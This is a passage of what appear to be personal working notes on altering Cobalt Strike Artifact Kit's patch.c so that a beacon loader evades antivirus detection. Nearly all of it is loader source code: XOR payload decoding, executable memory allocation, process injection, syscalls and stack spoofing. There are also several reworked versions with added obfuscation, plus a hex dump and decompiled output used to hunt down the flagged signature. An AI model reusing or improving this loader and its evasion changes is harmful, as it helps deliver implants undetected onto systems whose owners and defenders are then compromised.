    for (z = 0; z < length; z++) {
        char *a = (char *)buffer + z;
        char *b = (char *)buffer + z;

        // Call GetTickCount() (though not used in this logic)
        GetTickCount();

        // XOR the payload with the key
        *a = *b ^ key[z % 8];
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);

    /* inject the decoded payload */
    inject(buffer, length, process);
}

```

![[Pasted image 20250130004701.png]]
before going to the `patch.c` that worked

```bash
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void *buffer, int length, char *key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (z = 0; z < sizeof(process); z++) {
        char *a = (char *)process + z;
        char *b = (char *)process + z;

        // Call GetTickCount() (though not used in this logic)
        GetTickCount();

        // XOR the process name with the key
        *a = *b ^ key[z % 8];
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char *a = (char *)buffer + z;
        char *b = (char *)buffer + z;

        // Call GetTickCount() (though not used in this logic)
        GetTickCount();

        // XOR the payload with the key
        *a = *b ^ key[z % 8];
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);

    /* inject the decoded payload */
    inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


for (int i = 0; i < length; i++) {
 char* a = (char *)ptr + i;
 char* b = (char *)buffer + i;
 GetTickCount();
 *a = *b ^ key[i % 8];
 }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif


```
ok with the `patch.c` that worked earlier, now getting detections
```bash
00000000  31 d2 41 89 d0 42 80 3c  01 00 74 16 41 89 c1 46  |1.A..B.<..t.A..F|                                                                                    00000010  0f b7 04 01 ff c2 41 c1  c9 08 45 01 c8 44 31 c0  |......A...E..D1.|                                                                                
```
![[Pasted image 20250130010136.png]]
need to solve this, its consistent
![[Pasted image 20250130010400.png]]

```bash
void FUN_140001d70(longlong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  while (*(char *)(param_1 + (ulonglong)uVar1) != '\0') {
    uVar1 = uVar1 + 1;
  }
  return;
}

```
this is the only function in `patch.c` that has a `return;` i think this might be it
![[Pasted image 20250130010939.png]]

full patch.c before line 15-30 modification

```bash
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
    phear * payload = (phear *)data;

    /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
       the payload directly. */
    if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
        return;

    void * gpa_addr = (void *)GetProcAddress;
    void * gmh_addr = (void *)GetModuleHandleA;

    memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
    memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"

void spawn(void * buffer, int length, char * key) {
    char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
    int z;

    /* decode the process name with the key (valid name, \0, junk to fill 64) */
    for (int z = 0; z < sizeof(process); z++) {
        char* a = (char *)process + z;
        char* b = (char *)process + z;
        GetTickCount();
        *a = *b ^ key[z % 8]; // Original decryption logic
    }

    /* decode the payload with the key */
    for (z = 0; z < length; z++) {
        char* a = (char *)buffer + z;
        char* b = (char *)buffer + z;
        GetTickCount();
        *a = *b ^ key[z % 8]; // Original decryption logic
    }

    /* propagate our key function pointers to our payload */
    set_key_pointers(buffer);
    inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
    void (*function)();
    function = (void (*)())buffer;
#if STACK_SPOOF == 1
    beacon_threadid = GetCurrentThreadId();
#endif
    function();
}

void spawn(void * buffer, int length, char * key) {
    void * ptr = NULL;

    /* This memory allocation will be released by beacon for these conditions:
     *    1. The stage.cleanup is set to true
     *    2. The reflective loader passes the address of the loader into DllMain.
     *
     * This is true for the built-in Cobalt Strike reflective loader and the example
     * user defined reflective loader (UDRL) in the Arsenal Kit.
     */
#if USE_HeapAlloc
    /* Create Heap */
    HANDLE heap;
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

    /* allocate the memory for our decoded payload */
    ptr = HeapAlloc(heap, 0, 10);

    /* Get wacky and add a bit of of HeapReAlloc */
    if (length > 0) {
        ptr = HeapReAlloc(heap, 0, ptr, length);
    }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
    ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
    SIZE_T size = length;
    HANDLE hFile = create_file_mapping(0, length);
    ptr = map_view_of_file(hFile);
    NtClose(hFile);
#else
    HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
    ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    CloseHandle(hFile);
#endif
#endif

    // Modified decryption logic
    for (int i = 0; i < length; i++) {
        char* a = (char *)ptr + i;
        char* b = (char *)buffer + i;

        // Dynamic key generation using current time and random values
        srand((unsigned int)GetTickCount()); // Seed with current time
        char dynamicKey = (char)(rand() % 256); // Generate a random key per byte
        
        // Introduce time-based obfuscation
        DWORD tickDiff = GetTickCount() % 256;
        *a = *b ^ (dynamicKey ^ tickDiff); // XOR with dynamic key and time-based modification
    }

#if STACK_SPOOF == 1
    /* setup stack spoofing */
    set_stack_spoof_code();
#endif

    /* propagate our key function pointers to our payload */
    set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
    /* fix memory protection */
    DWORD old;
#if USE_SYSCALLS == 1
    NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
    VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

    /* spawn a thread with our data */
#if USE_SYSCALLS == 1
    HANDLE thandle;
    NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

```
like 14-30 will change to this

```bash
// Data for obfuscation
char obf_data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
    phear * payload = (phear *)obf_data;

    // Simple check with XOR to obfuscate the logic
    if ((payload->gmh_offset ^ 0x1A) <= 0 || (payload->gpa_offset ^ 0x3B) <= 0)
        return;

    void * gpa_addr = (void *)GetProcAddress;
    void * gmh_addr = (void *)GetModuleHandleA;

    // Copy function pointers, with a small XOR obfuscation on the offsets
    memcpy(buffer + (payload->gmh_offset ^ 0x5), &gmh_addr, sizeof(void *));
    memcpy(buffer + (payload->gpa_offset ^ 0x7), &gpa_addr, sizeof(void *));
}
```
before change
![[Pasted image 20250130011552.png]]
after change
![[Pasted image 20250130011623.png]]

old cobalt strike `patch.c`
145 lines
```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2023 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];  // 8 byte XoR
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif


```
new patch.c

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];  // 8 byte XoR
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif
```
